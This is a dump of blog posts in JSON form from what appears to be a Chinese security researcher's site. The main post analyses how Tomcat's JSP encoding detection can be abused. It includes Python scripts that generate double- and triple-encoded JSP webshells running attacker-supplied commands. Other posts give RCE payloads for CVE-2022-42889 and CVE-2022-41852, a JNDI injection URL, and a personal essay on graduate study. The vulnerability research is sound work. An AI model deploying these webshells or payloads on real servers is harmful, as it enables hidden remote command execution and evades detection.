1http://admin-portal:80/c/portal/portlet_url?parameterMap=&#123;&quot;javaClass&quot;:&quot;org.hibernate.jmx.StatisticsService&quot;,&quot;sessionFactoryJNDIName&quot;:&quot;ldap://ip&quot;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Nodejs","slug":"Nodejs","permalink":"https://y4tacker.github.io/tags/Nodejs/"}]},{"title":"浅谈JspWebshell之编码","slug":"year/2022/11/浅谈JspWebshell之编码","date":"2022-11-27T06:39:48.000Z","updated":"2024-08-04T09:01:49.080Z","comments":true,"path":"2022/11/27/year/2022/11/浅谈JspWebshell之编码/","link":"","permalink":"https://y4tacker.github.io/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/","excerpt":"","text":"浅谈JspWebshell之编码写在前面​ 最近@phithon在知识星球中分享了一个多重编码的webshell姿势后，先膜一下大佬 出于对代码实现的好奇简单看了看tomcat的具体实现以及尝试是否能够更深入的目的也便有了本篇，当然后面也发现这种方式不太灵活是有一定编码限制的，后面也会提到，当然最终经过我的努力，发现了其他三种实现双重编码的方式，甚至最后发现可以实现三重编码 那么下面就进入正文吧 环境相关及其他说明​ 本篇以tomcat8.0.50为例进行分析，后文简称为tomcat，同时讨论的是第一次访问并编译jsp的过程(有小区别不重要)并且不涉及到其他小版本差异 正文这里没有那么多废话，我们知道其实jsp是Servlet技术的扩展，它本身也是一种模板，通过对这个模板内容的解析，根据一定规则拼接到一个java文件后最终会编译为一个class文件并加载，在这个过程当中就涉及的很多解析的过程，这里由于主题限制，我们不必太过关心，我们重点偏向于去了解它的编码是如何被识别的即可. 对于这部分处理逻辑其实是由org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding做处理，在这个类方法当中有两个比较重要的属性isXml与sourceEnc，字面理解就能得出一个判定是否jsp格式是通过xml格式编写，另一个sourceEnc也就决定着jsp文件的编码相关 关于xml格式的一些简单说明xml声明这里我们我们只需要知道encoding属性可以决定内容编码即可 tomcat对于xml格式还算比较严格，其中如果需要用到xml声明&lt;?xml要求“必须”在首位，说明下这里的必须指的是需要解析并获取这个标签中的属性，比如encoding就决定着后续内容的编码，我们需要它生效就需要将这个xml声明放置在文件内容最前面(Ps：这里的最前面指的是被解码后的字符在文件最前面，并不是一定要求是原生的字符串&lt;?xml)，当然如果不需要其实这里就不太重要了 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 如果个人比较好奇这部分代码逻辑可以自行看看org.apache.jasper.xmlparser.XMLEncodingDetector#getEncoding(java.io.InputStream, org.apache.jasper.compiler.ErrorDispatcher) 如何识别我们的文件内容是xml格式接下来再来简单说说是如何识别我们的文件是xml格式的呢？ 首先是根据后缀名.jspx或.tagx，当然这俩不在我们今天讨论的范围内 如果后缀名不符合则根据文本内容是否包含有形如&lt;xxx:root格式的文本，如果有也会识别为一个xml格式 如何决定一个文件的编码如何从字节顺序标记(BOM)判断文本内容编码简单来说这部分逻辑其实和W3C所定义的一致 W3C定义了三条XML解析器如何正确读取XML文件的编码的规则： 1.如果文挡有BOM(字节顺序标记)，就定义了文件编码 2.如果没有BOM，就查看XML encoding声明的编码属性 3.如果上述两个都没有，就假定XML文挡采用UTF-8编码 我们的tomcat对这部分实现也是手写根据文件前4个字节(BOM)来决定文件的编码(org.apache.jasper.compiler.ParserController#determineSyntaxAndEncoding) 具体是通过函数XMLEncodingDetector#getEncoding来动态决定编码 12345678910111213private Object[] getEncoding(InputStream in, ErrorDispatcher err) throws IOException, JasperException&#123; this.stream = in; this.err=err; createInitialReader(); scanXMLDecl(); return new Object[] &#123; this.encoding, Boolean.valueOf(this.isEncodingSetInProlog), Boolean.valueOf(this.isBomPresent), Integer.valueOf(this.skip) &#125;;&#125; 在这里有两个关键函数，它们都能决定整个文件内容的编码 12createInitialReader();scanXMLDecl(); 其中createInitialReader作用有两个一个是根据前四个字节(bom)决定encoding也就是编码，接着往里看在org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingName中 逻辑很简单，就是根据前4个字节顺序标记判定文件编码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152private Object[] getEncodingName(byte[] b4, int count) &#123; if (count &lt; 2) &#123; return new Object[]&#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; int b0 = b4[0] &amp; 0xFF; int b1 = b4[1] &amp; 0xFF; if (b0 == 0xFE &amp;&amp; b1 == 0xFF) &#123; return new Object [] &#123;&quot;UTF-16BE&quot;, Boolean.TRUE, Integer.valueOf(2)&#125;; &#125; if (b0 == 0xFF &amp;&amp; b1 == 0xFE) &#123; return new Object [] &#123;&quot;UTF-16LE&quot;, Boolean.FALSE, Integer.valueOf(2)&#125;; &#125; if (count &lt; 3) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; int b2 = b4[2] &amp; 0xFF; if (b0 == 0xEF &amp;&amp; b1 == 0xBB &amp;&amp; b2 == 0xBF) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Integer.valueOf(3)&#125;; &#125; if (count &lt; 4) &#123; return new Object [] &#123;&quot;UTF-8&quot;, null, Integer.valueOf(0)&#125;; &#125; int b3 = b4[3] &amp; 0xFF; if (b0 == 0x00 &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x3C) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, Boolean.TRUE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x3C &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, Boolean.FALSE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x3C &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, null, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x3C &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;ISO-10646-UCS-4&quot;, null, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x00 &amp;&amp; b1 == 0x3C &amp;&amp; b2 == 0x00 &amp;&amp; b3 == 0x3F) &#123; return new Object [] &#123;&quot;UTF-16BE&quot;, Boolean.TRUE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x3C &amp;&amp; b1 == 0x00 &amp;&amp; b2 == 0x3F &amp;&amp; b3 == 0x00) &#123; return new Object [] &#123;&quot;UTF-16LE&quot;, Boolean.FALSE, Integer.valueOf(4)&#125;; &#125; if (b0 == 0x4C &amp;&amp; b1 == 0x6F &amp;&amp; b2 == 0xA7 &amp;&amp; b3 == 0x94) &#123; return new Object [] &#123;&quot;CP037&quot;, null, Integer.valueOf(4)&#125;; &#125; return new Object [] &#123;&quot;UTF-8&quot;, null, Boolean.FALSE, Integer.valueOf(0)&#125;; &#125; createInitialReader另一个作用就是初始化Reader对象(reader = createReader(stream, encoding, isBigEndian))，在Reader里面带有我们对文件编码以及字节序列大小端的关键信息，为下一步调用scanXMLDecl扫描解析xml的申明内容做了一个前置准备，在scanXMLDecl当中我们其实只需要关注和编码相关的属性(Ps:具体逻辑可以自己看看代码也比较简单，这里相关度不高不多提)，也就是上面xml小节里面提到的 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 这里面xml属性的encoding也可以决定整个文件的编码内容，同时我们可以发现这个encoding可以覆盖掉上一步的函数createInitialReader();(通过前四字节识别出的编码识别的encoding)，因此配合这个我们也可以构造出一种新的双编码jspwebshell，最后会提到 无法根据前四个字节判断文本编码怎么办当无法根据前四个字节判断文本编码时，jsp还提供了另一种方式帮助识别编码，对应下图中的getPageEncodingForJspSyntax 有兴趣看看这个函数的实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051private String getPageEncodingForJspSyntax(JspReader jspReader, Mark startMark) throws JasperException &#123; String encoding = null; String saveEncoding = null; jspReader.reset(startMark); while (true) &#123; if (jspReader.skipUntil(&quot;&lt;&quot;) == null) &#123; break; &#125; if (jspReader.matches(&quot;%--&quot;)) &#123; if (jspReader.skipUntil(&quot;--%&gt;&quot;) == null) &#123; break; &#125; continue; &#125; boolean isDirective = jspReader.matches(&quot;%@&quot;); if (isDirective) &#123; jspReader.skipSpaces(); &#125; else &#123; isDirective = jspReader.matches(&quot;jsp:directive.&quot;); &#125; if (!isDirective) &#123; continue; &#125; if (jspReader.matches(&quot;tag &quot;) || jspReader.matches(&quot;page&quot;)) &#123; jspReader.skipSpaces(); Attributes attrs = Parser.parseAttributes(this, jspReader); encoding = getPageEncodingFromDirective(attrs, &quot;pageEncoding&quot;); if (encoding != null) &#123; break; &#125; encoding = getPageEncodingFromDirective(attrs, &quot;contentType&quot;); if (encoding != null) &#123; saveEncoding = encoding; &#125; &#125; &#125; if (encoding == null) &#123; encoding = saveEncoding; &#125; return encoding; &#125; 课代表直接总结了，简单来说最终其实就是根据文本内容中的pageEncoding的值来决定最终编码，这里有两种写法 第一种 1234567&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;或&lt;%@ page contentType=&quot;charset=utf-16be&quot; %&gt;或&lt;%@ tag language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;或&lt;%@ tag contentType=&quot;charset=utf-16be&quot; %&gt; 第二种 1234567&lt;jsp:directive.page pageEncoding=&quot;utf-16be&quot;/&gt;或&lt;jsp:directive.page contentType=&quot;charset=utf-16be&quot;/&gt;或&lt;jsp:directive.tag pageEncoding=&quot;utf-16be&quot;/&gt;或&lt;jsp:directive.tag contentType=&quot;charset=utf-16be&quot;/&gt; 同时如果使用的page后面可以不需要空格,也就是形如&lt;%@ pagepageEncoding=&quot;utf-16be&quot; %&gt;或&lt;jsp:directive.pagepageEncoding=&quot;utf-16be&quot;/&gt;具体可以看看代码的解析这部分不重要 因此看到这里你就知道为什么开头提到的phithon提供的demo能够成功解析的原因了 第二种 第三种 为什么上面这个有一定局限性实际上如果你认真看了上面的代码你会发现决定具体代码逻辑是否能走到这一步和isBomPresent的值密不可分，我们也说到了只有文件前四个字节无法与org.apache.jasper.xmlparser.XMLEncodingDetector#getEncodingName这个方法中某个编码匹配，之后假定XML文挡采用UTF-8编码，最终才能保证isBomPresent为false，因此这种利用的局限性在于文件头只能是utf8格式才能保证代码逻辑的正确执行 更灵活的双编码jspwebshell根据我们前面的分析，下面这种方式实现双编码会更灵活，可以更多样地选择双编码间的组合 这里简单写个python生成一个即可作为演示 12345678910111213141516171819202122a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt; &lt;jsp:directive.page contentType=&quot;text/html&quot;/&gt; &lt;jsp:declaration&gt; &lt;/jsp:declaration&gt; &lt;jsp:scriptlet&gt;Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));String line = &quot;&quot;;while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;);&#125;&lt;/jsp:scriptlet&gt; &lt;jsp:text&gt; &lt;/jsp:text&gt;&lt;/jsp:root&gt;&#x27;&#x27;&#x27;with open(&quot;test.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-16&quot;)) f.write(a1.encode(&quot;cp037&quot;)) 简单测试没毛病 访问测试 多说一下这里也只是相对灵活，从执行逻辑来看必须要是XMLEncodingDetector#getEncodingName能够识别的范围才行，因此在我这个版本中其实对应着UTF-8\\UTF-16BE\\UTF-16LE\\ISO-10646-UCS-4\\CP037作为前置编码，当然后置就无所谓啦基本上java中的都行 避免双编码踩坑这里面有一个很大的坑！什么坑呢？ 这里我们以前置cp037+后置utf-16为例进行说明 我们看看前置部分，通常我们在写前置部分的时候不会在意其长度，比如下面的代码输出长度为41，这就是一个巨大的坑点！ 12a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;utf-16be&#x27;?&gt;&#x27;&#x27;&#x27;print(len(a0.encode(&quot;cp037&quot;))) 为什么？我们前面说过在后面通过文件内容判断是否为xml格式时，是通过检查里面是否含有&lt;xxx:root这样的代码片段来进行判断，但是我们可以看看红色箭头，这里是直接把整个文件内容放在jspReader当中做解码 这意味着什么，我们刚刚说了前面部分长度是单数，而对于我们的utf-16是两个字节去解码，这就导致 本来这里应该是003c作为一个整体，由于前面c3p0编码后长度为单数，导致最终为3c00去做了解码，因此最终导致识别不到&lt;xxx:root这样的代码片段，就导致程序认为这并不是一个xml格式的写法 最终在org.apache.jasper.compiler.ParserController#doParse做解析并拼接jsp模板的时候无法成为正确的代码，而识别不到正确的格式就导致执行下面分支出错，原本该是执行的代码变成了一堆乱码显示到页面中(有兴趣可以看看下面)这个分支中具体的解析流程也蛮有意思) 任意放置的jspReader.matches与%@刚刚我们只提到了这两个标签的利用具有编码的局限性，然而如果你再仔细看我们后面提出的两种新的编码利用会发现在函数getPageEncodingForJspSyntax中，它通过while循环不断往后查找符号&lt;，之后在调用jspReader.matches寻找%@或jsp:directive. 123456789101112131415161718192021222324private String getPageEncodingForJspSyntax(JspReader jspReader, Mark startMark) throws JasperException &#123; xxxx while (true) &#123; if (jspReader.skipUntil(&quot;&lt;&quot;) == null) &#123; break; &#125; xxxx boolean isDirective = jspReader.matches(&quot;%@&quot;); if (isDirective) &#123; jspReader.skipSpaces(); &#125; else &#123; isDirective = jspReader.matches(&quot;jsp:directive.&quot;); &#125; if (!isDirective) &#123; continue; &#125; xxxx &#125; 因此从这里我们可以看出&lt;jsp:directive.或&lt;%@并没有要求在某个具体的位置，因此它可以在最前面，可以在中间甚至可以在最后面 这里我们可以验证下，这里我们把它藏在了一个变量当中 测试demo 1234567891011121314a0 = &#x27;&#x27;&#x27;&lt;% Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;)); java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String line = &quot;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;a2 = &#x27;&#x27;&#x27;&quot;; while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;); &#125;%&gt;&#x27;&#x27;&#x27;with open(&quot;test2.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-16be&quot;)) f.write(a1.encode(&quot;utf-8&quot;)) f.write(a2.encode(&quot;utf-16be&quot;)) 成功利用 三重编码在上面的基础上我们还可以进一步利用，为什么呢？我们知道它在识别标签&lt;jsp:directive.或&lt;%@的过程中是调用了jspReader.xxx去实现的，而这个jspReader来源于前面的调用 123456JspReader jspReader = null;try &#123; jspReader = new JspReader(ctxt, absFileName, sourceEnc, jar, err);&#125; catch (FileNotFoundException ex) &#123; throw new JasperException(ex);&#125; 聪明的你一定能看出这里的sourceEnc是我们可以控制的(前面讲过了忘了往上翻复习下) 因此我们对整个利用梳理一下 保证无法通过BOM识别出文本内容编码(保证isBomPresent为false) 通过&lt;?xml encoding=&#39;xxx&#39;可以控制sourceEnc的值 将标签&lt;jsp:directive.或&lt;%@放置在全文任意位置但不影响代码解析 通过标签&lt;jsp:directive.或&lt;%@的pageEncoding属性再次更改文本内容编码 这里我按要求随便写了一个符合的例子 12345678910111213141516a0 = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;a1 = &#x27;&#x27;&#x27;&lt;% Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;)); java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String line = &quot;&#x27;&#x27;&#x27;a2 = &#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;a3 = &#x27;&#x27;&#x27;&quot;; while ((line = input.readLine()) != null) &#123; out.write(line+&quot;\\\\n&quot;); &#125;%&gt;&#x27;&#x27;&#x27;with open(&quot;test3.jsp&quot;,&quot;wb&quot;) as f: f.write(a0.encode(&quot;utf-8&quot;)) f.write(a1.encode(&quot;utf-16be&quot;)) f.write(a2.encode(&quot;cp037&quot;)) f.write(a3.encode(&quot;utf-16be&quot;)) 生成三重编码文件 测试利用 其他其实在这个过程当中还顺便发现了一个有趣的东西，虽然和讲编码的主题无关，但个人觉得比较有意思就顺便放在最后了，对于jsp不同的部分对应的空格判定是不同的 比如在对xml文件头做解析的时候(&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;) 这里调用的是org.apache.jasper.xmlparser.XMLChar#isSpace 123public static boolean isSpace(int c) &#123; return c &lt;= 0x20 &amp;&amp; (CHARS[c] &amp; MASK_SPACE) != 0;&#125; 省去给大家看常量浪费时间，这里当课代表总结一下就是四个字符\\x0d、\\x0a9、\\x0a、\\x0d 而在识别&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;这部分中对空格的判定调用的是org.apache.jasper.compiler.JspReader#isSpace，这里判断的空格只要保证在\\x20之前即可 123final boolean isSpace() &#123; return peekChar() &lt;= &#x27; &#x27;;&#125; 当然更多的部分就不多说啦，毕竟已经和本文由点偏离啦","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Webshell","slug":"Webshell","permalink":"https://y4tacker.github.io/tags/Webshell/"}]},{"title":"读研的意义？","slug":"year/2022/11/读研的意义？","date":"2022-11-02T14:29:16.000Z","updated":"2024-08-04T09:01:49.090Z","comments":true,"path":"2022/11/02/year/2022/11/读研的意义？/","link":"","permalink":"https://y4tacker.github.io/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/","excerpt":"","text":"读研的意义？写在前面​ 每个人都有各自不同的处境，在每个阶段也会有自己不同的看法，我写这篇随笔也不是想去争论什么，只是觉得该记录一个状态，只是觉得我人生的一部分意义在于不断思考，而这部分思考我想留在未来某一天，闲暇饭余时间再翻开看看，也见证我个人的些许成长. 正文​ 一切的源头还是来自于吃完泡面无意间看到的校友发的一篇灵魂发问帖子(顺便吐槽下可恶的坏蛋室友，两个人合伙吃泡面香我，馋啊…又白锻炼了) 对我而言，我以为很多时候我们选择读研就像当初为什么我们去选择高考一样，一是迫于社会环境，二是我们还很年轻，习惯于被别人安排好道路对家长老师的话只能言听计从，但很多时候我们身为学生确实也身不由己，只能走一步看一步，我们没有退路也没有多余的选择. 而对于我们不同的时间点也会有不同的想法 高中时期我在想什么呢？“班主任告诉我们大学很重要决定一生，读了研更是人上人！” 大一时期我在想什么呢？“我成绩这么好，不读研太浪费机会了” 大二时期经历一些事后，“读研似乎并不是我所要的，放弃吧，忘掉之前的成绩吧” 可虽说放弃，后面经历一些挫折之后也时不时想要回头，因为当时还是离不开周围对我的影响，总觉得胜利的天平开始倾斜 到了现在，经历前段时间保研风波以及秋招后，“接受崭新的自己吧，接受眼前的未知吧” 对于读不读研，如果放弃我们也必须承担放弃的风险， 这时候大概会有三种情况， 一是本来我本科出去确实也找不到一个很好的工作，读个研镀个金，喘两三年气，说不定我会有更好的平台 另一种情况是，我本科能找到一个很好的工作，读完研以后我可能连当初水平的工作都没有 至于最后一种，本科就很不错，读完研深造我变得更好了 这个时候其实已经进入了一个怪圈了，也就是我们的学生思维 我们总是认为努力就会有收获，映射到生活中就是，我听课了就能有好成绩，我实习了就可以转正，我对你好你就会对我好，事实真的如此么？相信经历了这么多你也开始怀疑，怀疑本身并不可怕，但可怕的是，我们却一直只是在怀疑罢了，我们不敢去做出改变，这股奇怪的思想会一直笼罩着我们，从大一到大四，这时候你不得不面临选择了，但这时候你却突然发现你又没的选择，这时候我们就又进入了高中时期那般思考，而这种思考叫做依赖，我们一直依赖别人，依赖别人去帮我们做出选择，我们总是习惯呆在一个舒适圈当中，不愿去打破眼前的小美好，但其实社会并不会一直宠我们，我们需要尽早做出适应做出改变，走出父母的怀抱，成长都是痛苦的，这一路上必然会伴随着荆棘，也伴随着周围异样的目光，当然我也不排除有人天生就是智力高，运气就是好，只需要一点点的努力就能有很好的回报，但我也问过我自己，你觉得你是么？答案显而易见，不是，因此走出心里的舒适圈，拥抱变化才是我该做的。 在这个过程中我也一直很感激我的父母，感激我处于一个很开放的家庭，在家里我的身份是父母的孩子，但从大学后再行为上我明显更感受到我们是“同辈“，他们尊重我的每一个决定，我记得当初我对他们说“我放弃了某个很好学校的保研”， 他们的回答是“你想好了吗？我们还是认为读研对你会更好？但是我们毕竟什么也不懂，我们会尊重你的决定，但希望你再好好想想！” 我很确信没有他们的支持我确实也走不到今天，因此我很感激我的父母，没有他们我不会获得这么自由。 好了今天就到这里，该说的也都说的差不多了，我也困了，该刷刷b站睡觉了…zzz 后话希望你看到这里，不要心里猛的冲动毁掉自己现有的成果，毕竟我们不能保证改变就会变好，就这个时间点来说可能会变得更差，也可能变得更好，我们也需要对这个世界一些妥协，为漫长的人生路增加一些抗风险的能力，也为你的人生多一点加分。当然我们也可以选择坚信，向着这个世界，对着未知发起冲撞，至于收获嘛，可能就是更多的坎坎坷坷，以及痛苦的成长了。 写给学弟学妹们​ 希望看到这篇感想的是我大一大二的学弟学妹们，因为你们的可塑性还很强，还有短时期人生决定的能力，希望你们能认清自己，认清周围的环境，不要一味的看着成绩，一位想着只有读研这一条路子，适当的时候也给自己多条后路，说这些话我也并不鼓励你们都去无脑选择工作(更希望你是因为想工作而工作，不是因为自己的颓废而造成没得选)，毕竟我也从你们的阶段走过，我也理解你们各个时期的想法，当然最终不管是工作还是选择继续深造，我更希望你能坚定信心，开开心心的走下去。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"浅析Apache Commons Text(CVE-2022-42889)","slug":"year/2022/10/浅析Apache-Commons-Text-CVE-2022-42889","date":"2022-10-29T06:31:19.000Z","updated":"2024-08-04T09:01:49.074Z","comments":true,"path":"2022/10/29/year/2022/10/浅析Apache-Commons-Text-CVE-2022-42889/","link":"","permalink":"https://y4tacker.github.io/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/","excerpt":"","text":"浅析Apache Commons Text(CVE-2022-42889)前段时间我在知识星球上布置了一个小作业，算是赶在一个新的CVE发布之前做了个简单预警了 之后呢可以预见，Apache官方确实在几天后发布了一次更新，内容是https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om，版本更新以及CVE的内容 其实总体而言这个的挖掘难度不算高，和前一段时间刚出的Apache Commons Configuration的RCE长的也基本一致，原理也不必多说 根据官方的demo呢，咋们也可以很容易看出它的基本用法以及漏洞出发点 简单的从org.apache.commons.text.lookup.DefaultStringLookup也可以看出，它支持一个script的用法 它对应于一个叫org.apache.commons.text.lookup.ScriptStringLookup的类，从它的lookup方法当中我们也可以看到，这就是我们平时RCE所常用到的执行JS实现RCE 因此POC也相对简单 1$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)&#125; 整个漏洞比较简单，但从漏洞形式以及组件类型来说危害极大，但经过搜索发现网上开源项目中用到的虽然也有，但却看不见向官方demo当中提到的这种用法，当然也不排除一些内部厂商自己使用这样的写法，作为给新手学习了解这个洞还是不错的，因此也有在知识星球发小作业的形式.","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache Commons Text","slug":"Apache-Commons-Text","permalink":"https://y4tacker.github.io/tags/Apache-Commons-Text/"}]},{"title":"浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)","slug":"year/2022/10/浅析Apache-Commons-Jxpath命令执行分析-CVE-2022-41852","date":"2022-10-13T12:21:30.000Z","updated":"2024-08-04T09:01:49.065Z","comments":true,"path":"2022/10/13/year/2022/10/浅析Apache-Commons-Jxpath命令执行分析-CVE-2022-41852/","link":"","permalink":"https://y4tacker.github.io/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/","excerpt":"","text":"浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)本文首发于跳跳糖:https://tttang.com/archive/1771/ 影响版本commons-jxpath:commons-jxpath &lt;= 1.3 一直到最新版本，官方也不打算修了 利用探索测试环境：jxpath1.3 JXPath支持标准的XPath函数，开箱即用。它还支持 “标准 “扩展函数，这些函数基本上是通往Java的桥梁，以及完全自定义的扩展函数。 简单从漏洞描述可以看出由于解析xpath表达式的问题造成的漏洞 其实这来源官方的一个feature，如图看起来它赋予了我们一种动态执行代码的能力 这时候我们就会想为什么会有这种奇怪的需求，毕竟从平时经验来讲xpath，作为一种路径语言，它的功能是帮助我们对xml进行一些简单的信息检索，然而它叫JXpath而不叫Xpath，因此其实从实现上来讲它不仅实现了xpath查询的一些基础功能，更重要的是它搭建了一个通往java的桥梁，从官方的设计初衷也可以看出，它的设计实现其实更像一款表达式语言 Primary applications of JXPath are in scripting: JSP and similar template/script based technologies. However, programmers who prefer XML-flavored APIs, should consider JXPath as an alternative to other expression languages as well. JXPath is a must-have tool for those who work with mixtures of Java objects and XML and need to frequently traverse through graphs of those. 简单的测试简单写个测试demo Test.java 12345678import org.apache.commons.jxpath.JXPathContext;public class Test &#123; public static void main(String[] args) &#123; JXPathContext context = JXPathContext.newContext(null); context.getValue(&quot;com.example.springdemo.calc.calc()&quot;); &#125;&#125; Calc.java 1234567891011package com.example.springdemo;public class calc &#123; public static void calc()&#123; try &#123; Runtime.getRuntime().exec(&quot;open -na Calculator&quot;); &#125;catch (Exception e )&#123; &#125; &#125;&#125; 对于如何解析其实很多时候我们并不需要去关注对字符token的解析过程，毕竟我们这也不是绕waf，我们也不需要知道如何去实现一些畸形构造达到一致的功能，而在这里我们更应该关注什么呢？我们应该关注它官网这个feature如何实现的调用，以及调用方法对方法又有什么限制？ 在org.apache.commons.jxpath.PackageFunctions#getFunction当中 这里可以看出允许的调用一个是构造函数，另一个是静态方法，当然他们都需要是public修饰 再次回到org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue当中, 在获得了org.apache.commons.jxpath.Function对应的这个实例后，回去调用具体的invoke的实现 而Function具体的接口实现有两个类 org.apache.commons.jxpath.functions.ConstructorFunction org.apache.commons.jxpath.functions.MethodFunction 如何判断返回的是哪个类？ ConstructorFunction的invoke就不多说了，实例化构造函数，另一个MethodFunction#invoke，反射执行方法，都没什么好说的 那么我们假设就从官方的demo出发，我们能做些什么？ 对于实例化我们能做什么比如说对于new这个操作来说，一些常见的如spring当中有两个类构造函数就能加载远程配置可以rce org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext 对于静态方法我们能做什么jndi当中有静态方法，javax.naming.InitialContext.doLookup 一些常见库比如fastjson出发json反序列化 当然还有jdbc攻击也可以帮助我们撕开一条漏洞的口子 当然肯定还有其他的攻击手法毕竟jre当中有很多类这里只是举一些例子而已，对于学习足够了 想要更多？拿着tabby编译扫一下就行，毕竟在这里我们规则很简单构造函数、静态方法，只是筛选可能会费点时间罢了 突破限制​ 对于大多数人来说，其实想到上面几点就已经很不错了，但是考虑的也不够全面。毕竟面向官方feature学习，下个断点，随便点点，也确实差不多了。 ​ 对我们来说虽然用spirng开发的项目很多，但是我们也不一定能遇到spring的环境，也不一定有jdbc可以打。 ​ 而对于JXpath来说，虽然设计的像表达式，但它却不像其他表达式引擎那般灵活，支持随意赋值然后调用。也不能多条语句执行，它一次只能执行一条，怎么办呢？事实上如果你仔细看了最后一个demo你会发现有个长这样的 12String firstName = (String)context.getValue(&quot;getAuthorsFirstName($book)&quot;);//As you can see, the target of the method is specified as the first parameter of the function. 从英文来看其实就是$book.getAuthorsFirstName()，就是这么的简单。稍微会点Java的你可能也该想到 如果我们想要执行Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)，按照上面的例子其实就改为了exec(java.lang.Runtime.getRuntime(),&#39;open -na Calculator&#39;) 又或者我们利用ScriptEngineManager调用js实现rce eval(getEngineByName(javax.script.ScriptEngineManager.new(),&#39;js&#39;),&#39;java.lang.Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)&#39;) 方法也便多了起来，有时候多往下面看看，真的可以节约很多时间，不然就需要仔细看看字符串的解析流程，属实无趣。","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache Commons 